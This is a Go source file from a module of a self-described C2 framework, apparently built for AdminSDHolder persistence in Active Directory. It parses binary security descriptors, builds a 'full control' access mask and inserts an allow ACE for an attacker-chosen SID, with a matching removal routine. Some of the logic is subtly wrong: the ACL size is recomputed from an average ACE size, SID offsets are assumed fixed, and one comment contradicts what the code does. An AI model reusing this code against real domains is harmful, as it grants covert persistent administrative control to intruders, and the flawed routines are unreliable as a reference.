package adminsdholder

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Windows Security Descriptor and ACL manipulation.

	A Windows Security Descriptor (SD) in binary (self-relative) format:
	  SECURITY_DESCRIPTOR_RELATIVE header (20 bytes):
	    Revision     BYTE   = 1
	    Sbz1         BYTE   = 0
	    Control      WORD   flags (SE_DACL_PRESENT=0x0004, SE_SELF_RELATIVE=0x8000, etc.)
	    OffsetOwner  DWORD  = offset to owner SID from SD start
	    OffsetGroup  DWORD  = offset to group SID from SD start
	    OffsetSacl   DWORD  = offset to SACL from SD start (0 if absent)
	    OffsetDacl   DWORD  = offset to DACL from SD start

	  DACL (at OffsetDacl):
	    ACL header (8 bytes):
	      AclRevision  BYTE  = 2
	      Sbz1         BYTE  = 0
	      AclSize      WORD  = total bytes of ACL including header
	      AceCount     WORD  = number of ACE entries
	      Sbz2         WORD  = 0

	    ACE entries (variable):
	      ACCESS_ALLOWED_ACE:
	        AceType   BYTE  = 0 (ACCESS_ALLOWED_ACE_TYPE)
	        AceFlags  BYTE  = 0 (or INHERITED_ACE=0x10, etc.)
	        AceSize   WORD  = total bytes of this ACE
	        AccessMask DWORD = rights granted
	        SID       (variable) = trustee SID

	We parse the binary SD from the nTSecurityDescriptor LDAP attribute,
	add our ACE to the DACL, and write back the modified SD.

	Access rights for Full Control on AD objects:
	  GENERIC_ALL                 = 0x10000000
	  ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100 (extended rights)
	  ADS_RIGHT_DS_CREATE_CHILD  = 0x00000001
	  ADS_RIGHT_DS_DELETE_CHILD  = 0x00000002
	  ADS_RIGHT_ACTRL_DS_LIST    = 0x00000004
	  ADS_RIGHT_DS_SELF           = 0x00000008
	  ADS_RIGHT_DS_READ_PROP      = 0x00000010
	  ADS_RIGHT_DS_WRITE_PROP     = 0x00000020
	  ADS_RIGHT_DS_DELETE_TREE    = 0x00000040
	  ADS_RIGHT_DS_LIST_OBJECT    = 0x00000080
	  DELETE                      = 0x00010000
	  READ_CONTROL               = 0x00020000
	  WRITE_DAC                  = 0x00040000
	  WRITE_OWNER                = 0x00080000
*/

import (
	"encoding/binary"
	"fmt"
)

// Access mask constants for AD objects.
const (
	AccessGenericAll        = uint32(0x10000000)
	AccessDSControlAccess   = uint32(0x00000100)
	AccessDSCreateChild     = uint32(0x00000001)
	AccessDSDeleteChild     = uint32(0x00000002)
	AccessDSListChildren    = uint32(0x00000004)
	AccessDSSelf            = uint32(0x00000008)
	AccessDSReadProp        = uint32(0x00000010)
	AccessDSWriteProp       = uint32(0x00000020)
	AccessDSDeleteTree      = uint32(0x00000040)
	AccessDSListObject      = uint32(0x00000080)
	AccessDelete            = uint32(0x00010000)
	AccessReadControl       = uint32(0x00020000)
	AccessWriteDAC          = uint32(0x00040000)
	AccessWriteOwner        = uint32(0x00080000)
	AccessFullControl       = AccessGenericAll | AccessDelete |
		AccessReadControl | AccessWriteDAC | AccessWriteOwner |
		AccessDSControlAccess | AccessDSReadProp | AccessDSWriteProp |
		AccessDSCreateChild | AccessDSDeleteChild | AccessDSListChildren |
		AccessDSSelf | AccessDSDeleteTree | AccessDSListObject
)

// ACE type constants.
const (
	AccessAllowedACEType         = byte(0x00)
	AccessDeniedACEType          = byte(0x01)
	AccessAllowedObjectACEType   = byte(0x05)
	AccessAllowedCallbackACEType = byte(0x09)
)

// ACE flag constants.
const (
	AceFlagContainerInherit = byte(0x02) // CC
	AceFlagObjectInherit    = byte(0x01) // OI
	AceFlagInheritOnly      = byte(0x08) // IO
	AceFlagInherited        = byte(0x10) // inherited ACE (set by OS)
	AceFlagNoPropagateInherit = byte(0x04)
)

// SecurityDescriptor wraps a binary self-relative security descriptor.
type SecurityDescriptor struct {
	raw []byte
}

// ParseSecurityDescriptor parses a binary security descriptor.
func ParseSecurityDescriptor(raw []byte) (*SecurityDescriptor, error) {
	if len(raw) < 20 {
		return nil, fmt.Errorf("SD too short: %d bytes", len(raw))
	}
	if raw[0] != 1 { // Revision must be 1
		return nil, fmt.Errorf("unexpected SD revision: %d", raw[0])
	}
	return &SecurityDescriptor{raw: raw}, nil
}

// Raw returns the binary representation.
func (sd *SecurityDescriptor) Raw() []byte {
	return sd.raw
}

// DACLOffset returns the byte offset of the DACL within the SD.
func (sd *SecurityDescriptor) DACLOffset() uint32 {
	return binary.LittleEndian.Uint32(sd.raw[16:])
}

// ACECount returns the number of ACEs in the DACL.
func (sd *SecurityDescriptor) ACECount() uint16 {
	off := sd.DACLOffset()
	if off == 0 || int(off)+8 > len(sd.raw) {
		return 0
	}
	return binary.LittleEndian.Uint16(sd.raw[off+4:])
}

// AddAllowedACE appends an ACCESS_ALLOWED_ACE to the DACL for the given SID.
// The ACE is inserted at position 0 (before inherited ACEs) for proper ordering.
func (sd *SecurityDescriptor) AddAllowedACE(sid []byte, accessMask uint32, flags byte) error {
	daclOff := sd.DACLOffset()
	if daclOff == 0 {
		return fmt.Errorf("SD has no DACL")
	}
	if int(daclOff)+8 > len(sd.raw) {
		return fmt.Errorf("DACL offset out of bounds")
	}

	// Build the new ACE.
	aceSize := uint16(4 + len(sid)) // AceType(1)+AceFlags(1)+AceSize(2) + AccessMask(4) + SID
	aceSize = aceSize + 4           // AccessMask is 4 bytes
	newACE := make([]byte, aceSize)
	newACE[0] = AccessAllowedACEType
	newACE[1] = flags
	binary.LittleEndian.PutUint16(newACE[2:], aceSize)
	binary.LittleEndian.PutUint32(newACE[4:], accessMask)
	copy(newACE[8:], sid)

	// Read current DACL fields.
	daclSize := binary.LittleEndian.Uint16(sd.raw[daclOff+2:])
	aceCount := binary.LittleEndian.Uint16(sd.raw[daclOff+4:])

	// Find insertion point: after all explicit (non-inherited) ACEs.
	insertOff := int(daclOff) + 8 // start of ACE array
	for i := 0; i < int(aceCount); i++ {
		if insertOff+4 > len(sd.raw) {
			break
		}
		aceFlags := sd.raw[insertOff+1]
		thisAceSize := int(binary.LittleEndian.Uint16(sd.raw[insertOff+2:]))
		if aceFlags&AceFlagInherited != 0 {
			// This is an inherited ACE — insert before it.
			break
		}
		insertOff += thisAceSize
	}

	// Build new SD with the ACE inserted.
	newRaw := make([]byte, 0, len(sd.raw)+int(aceSize))
	newRaw = append(newRaw, sd.raw[:insertOff]...)
	newRaw = append(newRaw, newACE...)
	newRaw = append(newRaw, sd.raw[insertOff:]...)

	// Update DACL header: AclSize and AceCount.
	newDaclSize := daclSize + aceSize
	newAceCount := aceCount + 1
	binary.LittleEndian.PutUint16(newRaw[daclOff+2:], newDaclSize)
	binary.LittleEndian.PutUint16(newRaw[daclOff+4:], newAceCount)

	sd.raw = newRaw
	return nil
}

// HasACEForSID returns true if the DACL already contains an ACE for the given SID.
func (sd *SecurityDescriptor) HasACEForSID(sid []byte) bool {
	daclOff := sd.DACLOffset()
	if daclOff == 0 {
		return false
	}
	aceCount := sd.ACECount()
	off := int(daclOff) + 8
	for i := uint16(0); i < aceCount; i++ {
		if off+8 > len(sd.raw) {
			break
		}
		aceSize := int(binary.LittleEndian.Uint16(sd.raw[off+2:]))
		if aceSize < 8 {
			break
		}
		aceSID := sd.raw[off+8 : off+aceSize]
		if sidEqual(aceSID, sid) {
			return true
		}
		off += aceSize
	}
	return false
}

// RemoveACEsForSID removes all ACEs that grant rights to the given SID.
func (sd *SecurityDescriptor) RemoveACEsForSID(sid []byte) int {
	daclOff := sd.DACLOffset()
	if daclOff == 0 {
		return 0
	}
	aceCount := sd.ACECount()
	off := int(daclOff) + 8
	removed := 0
	newRaw := make([]byte, 0, len(sd.raw))
	newRaw = append(newRaw, sd.raw[:off]...)

	for i := uint16(0); i < aceCount; i++ {
		if off+8 > len(sd.raw) {
			break
		}
		aceSize := int(binary.LittleEndian.Uint16(sd.raw[off+2:]))
		if aceSize < 8 {
			break
		}
		aceSID := sd.raw[off+8 : off+aceSize]
		if !sidEqual(aceSID, sid) {
			newRaw = append(newRaw, sd.raw[off:off+aceSize]...)
		} else {
			removed++
		}
		off += aceSize
	}
	// Remaining SD bytes after the DACL.
	if off < len(sd.raw) {
		newRaw = append(newRaw, sd.raw[off:]...)
	}

	// Update counts.
	if removed > 0 {
		newDaclSize := uint16(int(binary.LittleEndian.Uint16(sd.raw[daclOff+2:])) -
			removed*(int(binary.LittleEndian.Uint16(sd.raw[daclOff+2:])/aceCount)))
		binary.LittleEndian.PutUint16(newRaw[daclOff+2:], newDaclSize)
		newAceCount := uint16(int(aceCount) - removed)
		binary.LittleEndian.PutUint16(newRaw[daclOff+4:], newAceCount)
		sd.raw = newRaw
	}
	return removed
}

// sidEqual compares two binary SIDs for equality.
func sidEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// ParseSIDString parses a "S-1-5-21-X-Y-Z-RID" string into binary SID format.
func ParseSIDString(sidStr string) ([]byte, error) {
	var revision, subAuthCount uint8
	var authority uint64
	var subs []uint32

	if len(sidStr) < 4 || sidStr[:2] != "S-" {
		return nil, fmt.Errorf("invalid SID string: %s", sidStr)
	}

	parts := splitDash(sidStr)
	if len(parts) < 3 {
		return nil, fmt.Errorf("SID has too few components: %s", sidStr)
	}

	revision = 1
	fmt.Sscanf(parts[1], "%d", &revision)
	fmt.Sscanf(parts[2], "%d", &authority)

	for _, p := range parts[3:] {
		var sub uint32
		fmt.Sscanf(p, "%d", &sub)
		subs = append(subs, sub)
	}
	subAuthCount = uint8(len(subs))

	buf := make([]byte, 8+len(subs)*4)
	buf[0] = revision
	buf[1] = subAuthCount
	// Authority: big-endian 6 bytes.
	buf[2] = byte(authority >> 40)
	buf[3] = byte(authority >> 32)
	buf[4] = byte(authority >> 24)
	buf[5] = byte(authority >> 16)
	buf[6] = byte(authority >> 8)
	buf[7] = byte(authority)
	for i, sub := range subs {
		binary.LittleEndian.PutUint32(buf[8+i*4:], sub)
	}
	return buf, nil
}

// SIDToString converts a binary SID to "S-1-5-..." string format.
func SIDToString(sid []byte) string {
	if len(sid) < 8 {
		return ""
	}
	revision := sid[0]
	subAuthCount := int(sid[1])
	authority := uint64(sid[2])<<40 | uint64(sid[3])<<32 | uint64(sid[4])<<24 |
		uint64(sid[5])<<16 | uint64(sid[6])<<8 | uint64(sid[7])
	result := fmt.Sprintf("S-%d-%d", revision, authority)
	for i := 0; i < subAuthCount; i++ {
		if 8+i*4+4 > len(sid) {
			break
		}
		sub := binary.LittleEndian.Uint32(sid[8+i*4:])
		result += fmt.Sprintf("-%d", sub)
	}
	return result
}

// AppendRID appends a RID to an existing domain SID to form a user SID.
func AppendRID(domainSID []byte, rid uint32) ([]byte, error) {
	if len(domainSID) < 8 {
		return nil, fmt.Errorf("domain SID too short")
	}
	newSID := make([]byte, len(domainSID)+4)
	copy(newSID, domainSID)
	newSID[1]++ // increment subAuthCount
	binary.LittleEndian.PutUint32(newSID[len(domainSID):], rid)
	return newSID, nil
}

func splitDash(s string) []string {
	var parts []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '-' {
			parts = append(parts, s[start:i])
			start = i + 1
		}
	}
	parts = append(parts, s[start:])
	return parts
}
